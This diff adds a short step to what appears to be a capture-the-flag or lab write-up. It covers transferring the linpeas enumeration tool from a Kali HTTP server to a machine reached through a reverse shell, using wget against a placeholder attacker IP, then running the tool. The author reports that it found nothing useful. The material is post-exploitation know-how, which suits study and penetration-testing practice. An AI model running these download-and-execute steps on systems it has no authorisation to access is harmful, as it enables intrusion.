@@ -189,6 +189,29 @@ If you are using a Terminal emulator such as Terminator, I found it easier to us
 
 ## Privilege Escalation
 
+* Let's transfer and run linpeas
+
+On Kali -- Start HTTP server for file transfer:
+
+```
+python3 -m http.server
+```
+
+On reverse shell -- wget for catching hosted file:
+
+```
+wget http://<kali_ip_here>:8000/linpeas_linux_amd64
+```
+
+Change permissions and execute file:
+
+```
+chmod +x linpeas_linux_amd64
+./linpeas_linux_amd64
+```
+
+* I was unble to find something of use
+
 ### Local enumeration
 
 ### PrivEsc vector
